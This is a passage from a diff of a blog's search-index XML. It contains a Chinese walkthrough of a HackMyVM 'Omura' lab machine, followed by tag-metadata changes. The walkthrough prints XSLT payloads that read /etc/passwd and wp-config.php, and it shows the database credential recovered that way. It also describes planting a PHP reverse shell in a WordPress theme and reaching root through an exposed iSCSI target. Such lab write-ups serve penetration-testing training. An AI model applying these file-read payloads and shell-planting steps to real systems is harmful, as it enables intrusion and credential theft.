class="name">catalog</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后创建一个read.xsl，用于读取/etc/passwd并输出到生成的XML文档中</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>上传两者之后点击执行，我们成功读取到了内容！</p><p>现在读取/var/www/wordpress目录下的内容</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/var/www/wordpress', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>得到的内容是</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">index.phplicense.txtreadme.htmlwordpresswp-activate.phpwp-adminwp-blog-header.phpwp-comments-post.phpwp-config.phpwp-contentwp-cron.phpwp-includeswp-links-opml.phpwp-load.phpwp-login.phpwp-mail.phpwp-settings.phpwp-signup.phpwp-trackback.phpxmlrpc.php</span><br></pre></td></tr></tbody></table></figure><p>读取wp-config.pgp</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0"&gt;</span><br><span class="line">&lt;xsl:template match="/"&gt;</span><br><span class="line">&lt;xsl:value-of select="unparsed-text('/var/www/wordpress/wp-config.php', 'utf-8')"/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></tbody></table></figure><p>得到敏感信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*/ define( 'DB_NAME', 'wordpressdb' ); /** Database username */ define( 'DB_USER', 'admin' ); /** Database password */ define( 'DB_PASSWORD', 'dw42k25MiXT' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); /</span><br></pre></td></tr></tbody></table></figure><p>得到凭证:admin/dw42k25MiXT</p><p>登录wordpress</p><p>尝试更改index.php为一个php反弹shell</p><p>但是更新的时候报错：</p><p>Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.</p><p> 尝试在右上角将主题改成twenty-two</p><p>开启监听，然后访问:</p><p> <a href="http://wordpress.omura.hmv/wp-content/themes/twentytwo/index.php">http://wordpress.omura.hmv/wp-content/themes/twentytwo/index.php</a></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>转移shell至msf</p><p>还有一个叫做ford的用户</p><p>试着用之前的凭证连接数据库，但是似乎没有什么用。</p><p>也许要用到之前的3260端口了</p><p>根据这篇</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi">https://book.hacktricks.xyz/network-services-pentesting/3260-pentesting-iscsi</a></p><p>先安装open-iscsi</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install open-iscsi</span><br></pre></td></tr></tbody></table></figure><p>在靶机上找到文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/sys/kernel/config/target/iscsi/iqn.2023-02.omura.hmv:target01/tpgt_1/acls/iqn.2023-02.omura.hmv:node01.initiator01/fabric_statistics/iscsi_sess_stats</span><br></pre></td></tr></tbody></table></figure><p>说明发起的目标是iqn.2023-02.omura.hmv:node01.initiator01</p><p>编辑kali上的/etc/iscsi/initiatorname.iscsi,添加上:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">InitiatorName=iqn.2023-02.omura.hmv:node01.initiator01</span><br></pre></td></tr></tbody></table></figure><p> 更改/etc/iscsi/initiatorname.iscsi ，取消掉注释</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># Startup settings</span><br><span class="line"></span><br><span class="line">#*****************</span><br><span class="line"></span><br><span class="line"># To request that the iscsi service scripts startup a session, use "automatic":</span><br><span class="line"></span><br><span class="line">node.startup = automatic</span><br></pre></td></tr></tbody></table></figure><p>重启服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl restart iscsid open-iscsi</span><br></pre></td></tr></tbody></table></figure><p>确认目标</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo iscsiadm -m discovery -t sendtargets -p 192.168.56.105</span><br></pre></td></tr></tbody></table></figure><p>连接：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo iscsiadm -m node --login</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></tbody></table></figure><p>发现新增了一块/dev/sdb分区，挂在到一个目录</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mkdir /tmp/omura</span><br><span class="line">sudo mount /dev/sdb /tmp/omura</span><br></pre></td></tr></tbody></table></figure><p>得到一个ssh私钥，可以用于连接root！</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>通过xsx和xml读取文件还是很有趣的233但是iscsi服务就有点冷门了吧，感觉是不会再遇到的233</p>]]></content>
       
       
       <categories>
@@ -2066,13 +2046,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> WordPress </tag>
             
         </tags>
       
@@ -2097,13 +2077,15 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> 日志中毒 </tag>
+            
+            <tag> OverFlow </tag>
             
         </tags>
       
@@ -2128,13 +2110,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> Mysql </tag>
             
         </tags>
       
@@ -2159,13 +2141,13 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> WordPress </tag>
             
         </tags>
       
@@ -2216,8 +2198,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
@@ -3065,13 +3045,17 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
+            
+            <tag> NoSQL </tag>
+            
+            <tag> Nodejs </tag>
             
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
+            
+            <tag> JWT </tag>
             
         </tags>
       
@@ -3897,8 +3881,6 @@
       
         <tags>
             
-            <tag> 网安 </tag>
-            
             <tag> 渗透测试 </tag>
             
             <tag> 笔记 </tag>
@@ -4554,8 +4536,6 @@
       
       
         <tags>
-            
-            <tag> 网安 </tag>
             
             <tag> 渗透测试 </tag>
             
